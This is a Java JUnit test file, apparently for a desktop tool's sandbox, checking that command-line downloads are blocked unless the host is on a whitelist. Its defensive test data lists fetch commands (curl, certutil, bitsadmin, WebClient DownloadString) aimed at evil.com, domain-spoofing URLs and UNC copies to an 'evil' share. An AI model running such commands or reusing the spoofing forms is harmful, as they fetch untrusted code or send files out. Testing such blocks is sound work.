package com.onesay.desktop;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Collections;
import java.util.List;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.Parameterized;

/**
 * [adv-1114] 命令默认断网 + 域名白名单（LinkPolicy.Rules#net、netReason、trustedHost、normDomain；PcGuard#rules：
 * 只读 / 工作区可写档断网，完全访问档不断）。白名单含子域；大小写、端口、userinfo、IP 字面量、IPv6、IDN、尾点、UNC 共享都要对。
 */
@RunWith(Parameterized.class)
public class AdvNetTest {

    static final String[] TOOLS = {"curl -sL {u}", "curl.exe -o out.bin {u}", "wget -q {u}", "Invoke-WebRequest -Uri {u} -OutFile x",
            "iwr {u} -UseBasicParsing", "irm {u}", "Invoke-RestMethod {u}", "Start-BitsTransfer -Source {u} -Destination x",
            "bitsadmin /transfer job {u} C:\\x", "certutil -urlcache -split -f {u} x.bin", "(New-Object Net.WebClient).DownloadString('{u}')",
            "(New-Object System.Net.WebClient).DownloadFile('{u}', 'x')"};
    static final String[] OK_URLS = {"https://example.com/a.zip", "http://example.com/a", "https://EXAMPLE.COM/a", "https://sub.example.com/a",
            "https://a.b.example.com:8443/a", "https://example.com:443/a", "https://user@example.com/a"};
    static final String[] BAD_URLS = {"https://evil.com/a", "https://example.com.evil.com/a", "https://evilexample.com/a", "https://example.co/a",
            "https://evil.com/example.com", "https://example.com@evil.com/a", "http://1.2.3.4/a", "http://[::1]/a", "https://localhost/a",
            "https://evil.com:443/a", "https://xn--exmple-cua.com/a", "https://example.com.evil.com:8443/a"};

    static final String CMD = "cmd", NORM = "norm", TRUST = "trust", MODE = "mode";

    @Parameterized.Parameters(name = "{index}: {0}")
    public static Collection<Object[]> rows() {
        AdvSupport.Rows r = new AdvSupport.Rows("net");
        List<String> allow = Collections.singletonList("example.com");
        for (String t : TOOLS) {
            for (String u : OK_URLS) r.add("ok " + t.replace("{u}", u), CMD, t.replace("{u}", u), allow, true, Boolean.TRUE, null);
            for (String u : BAD_URLS) r.add("bad " + t.replace("{u}", u), CMD, t.replace("{u}", u), allow, true, Boolean.FALSE, null);
            // 看不出域名（没写协议）：一律当要联网、拒
            r.add("nohost " + t, CMD, t.replace("{u}", "example.com/a"), allow, true, Boolean.FALSE, "看不出访问哪个域名");
            // 白名单空：谁都不行
            r.add("empty " + t, CMD, t.replace("{u}", "https://example.com/a"), Collections.<String>emptyList(), true, Boolean.FALSE, null);
            // 插件的断网项关着（完全访问档）：不拦
            r.add("netoff " + t, CMD, t.replace("{u}", "https://evil.com/a"), allow, false, Boolean.TRUE, null);
        }
        r.add("multi bad", CMD, "curl https://example.com/a https://evil.com/b", allow, true, Boolean.FALSE, "evil.com");
        r.add("multi ok", CMD, "curl https://example.com/a && curl https://sub.example.com/b", allow, true, Boolean.TRUE, null);
        r.add("not fetch", CMD, "echo https://evil.com/a", allow, true, Boolean.TRUE, null);
        r.add("ping not fetch", CMD, "ping evil.com", allow, true, Boolean.TRUE, null);
        // 白名单的各种写法（用户在设置里随手填的）
        String[] lists = {"*.example.com", "https://example.com/", "EXAMPLE.COM", "example.com.", " example.com ", "foo bar, example.com", "example.com;other.org"};
        for (String l : lists) {
            List<String> al = LinkPolicy.parseDomains(l);
            r.add("list[" + l + "] apex", CMD, "curl https://example.com/a", al, true, Boolean.TRUE, null);
            r.add("list[" + l + "] sub", CMD, "curl https://x.example.com/a", al, true, Boolean.TRUE, null);
            r.add("list[" + l + "] evil", CMD, "curl https://evil.com/a", al, true, Boolean.FALSE, null);
            r.add("list[" + l + "] suffix", CMD, "curl https://example.com.evil.com/a", al, true, Boolean.FALSE, null);
        }
        // UNC 共享（\\server\share、//server/share）也算联网；设备路径 \\?\ \\.\ 不算
        List<String> nas = Collections.singletonList("nas.example.com");
        Object[][] unc = {{"copy \\\\evil\\share\\a.txt .", false}, {"dir \\\\evil.com\\c$\\x", false}, {"type //evil/share/x", false},
                {"net use \\\\evil\\ipc$ /user:x", false}, {"copy \\\\nas.example.com\\share\\a.txt .", true}, {"dir \\\\?\\C:\\Windows", true},
                {"type \\\\.\\pipe\\x", true}, {"New-PSDrive -Name Z -PSProvider FileSystem -Root \\\\evil\\s", false},
                {"Get-Content \\\\NAS.EXAMPLE.COM\\s\\a", true}, {"explorer \\\\192.168.1.5\\share", false}, {"pushd \\\\sub.nas.example.com\\x", true},
                {"copy a.txt \\\\evil\\drop\\", false}};
        for (Object[] u : unc) r.add("unc " + u[0], CMD, u[0], nas, true, u[1], null);
        // normDomain：用户填的信任域名 → 规范形式（不合法 = null）
        String[][] norm = {{"example.com", "example.com"}, {"EXAMPLE.com", "example.com"}, {" example.com ", "example.com"},
                {"https://example.com/path", "example.com"}, {"http://Example.COM", "example.com"}, {"*.example.com", "example.com"},
                {"example.com.", "example.com"}, {"example.com...", "example.com"}, {"", null}, {"   ", null}, {"a@b.com", null}, {"a b.com", null},
                {"例子.测试", "xn--fsqu00a.xn--0zwm56d"}, {"bücher.de", "xn--bcher-kva.de"}, {"1.2.3.4", "1.2.3.4"}, {"[::1]", "[::1]"},
                {"https://", null}, {"*.", null}, {"exa_mple.com", null}, {"ex!ample.com", null}, {"xn--fsqu00a.xn--0zwm56d", "xn--fsqu00a.xn--0zwm56d"},
                {"EXAMPLE.COM/", "example.com"}, {"https://example.com?x", null}};
        for (String[] n : norm) r.add("norm[" + n[0] + "]", NORM, n[0], null, true, n[1], null);
        r.add("norm[null]", NORM, null, null, true, null, null);
        // trustedHost：等于或是子域；IP 不按子域算
        Object[][] tr = {{"example.com", "example.com", true}, {"sub.example.com", "example.com", true}, {"a.b.example.com", "example.com", true},
                {"example.com.evil.com", "example.com", false}, {"evilexample.com", "example.com", false}, {"xexample.com", "example.com", false},
                {"com", "example.com", false}, {"example.co", "example.com", false}, {"EXAMPLE.COM", "example.com", true},
                {"10.0.0.5", "10.0.0.5", true}, {"1.10.0.0.5", "10.0.0.5", false}, {"x.0.5", "0.5", false}, {"a.example.com", "*.example.com", true},
                {"example.com", "*.example.com", true}, {"x.com", "", false}, {"xn--fsqu00a.xn--0zwm56d", "例子.测试", true},
                {"b.xn--fsqu00a.xn--0zwm56d", "例子.测试", true}, {"example.com", "https://example.com/", true}, {"example.com", "bad entry", false},
                {"example.com.", "example.com", false}, {"ample.com", "example.com", false}};
        for (Object[] t : tr) r.add("trust " + t[0] + " in [" + t[1] + "]", TRUST, t[0], LinkPolicy.parseDomains((String) t[1]), true, t[2], null);
        r.add("trust null list", TRUST, "x.com", null, true, false, null);
        r.add("trust null host", TRUST, null, Collections.singletonList("x.com"), true, false, null);
        // 档位：只读 / 工作区可写断网，完全访问不断网
        for (LinkPolicy.Mode m : AdvSupport.allModes()) r.add("mode " + m, MODE, m.toString(), null, m.sandbox != LinkPolicy.Sandbox.FULL_ACCESS, null, null);
        return r.get();
    }

    @Parameterized.Parameter(0) public String name;
    @Parameterized.Parameter(1) public String kind;
    @Parameterized.Parameter(2) public String input;
    @Parameterized.Parameter(3) public List<String> allow;
    @Parameterized.Parameter(4) public boolean net;
    @Parameterized.Parameter(5) public Object expect;
    @Parameterized.Parameter(6) public String textHas;

    @Test public void check() throws Exception {
        switch (kind) {
            case CMD: {
                LinkPolicy.Rules rules = new LinkPolicy.Rules(true, allow, null);
                rules.net = net;
                LinkPolicy.Hit h = LinkPolicy.inspectCommand(input, rules);
                if (Boolean.TRUE.equals(expect)) assertNull(input + " 应放行：" + h, h);
                else {
                    assertNotNull(input + " 应被断网规则拦下", h);
                    assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, h.code);
                    assertTrue(h.text, h.text.contains("沙箱默认断网"));
                    if (textHas != null) assertTrue(h.text, h.text.contains(textHas));
                }
                break;
            }
            case NORM:
                assertEquals(String.valueOf(input), expect, LinkPolicy.normDomain(input));
                break;
            case TRUST:
                assertEquals(input + " in " + allow, expect, LinkPolicy.trustedHost(input, allow));
                break;
            case MODE: {
                String[] p = input.split("/");
                Config c = AdvSupport.cfg(LinkPolicy.Mode.of(p[0], p[1]));
                c.netAllow = "example.com";
                LinkPolicy.Rules rr = new PcGuard(c, null).rules();
                assertEquals(input, net, rr.net);
                assertEquals(Arrays.asList("example.com"), new ArrayList<>(rr.netAllow));
                assertTrue("插件默认开：编码命令拦截开着", rr.encoded);
                break;
            }
            default:
                throw new AssertionError(kind);
        }
    }
}
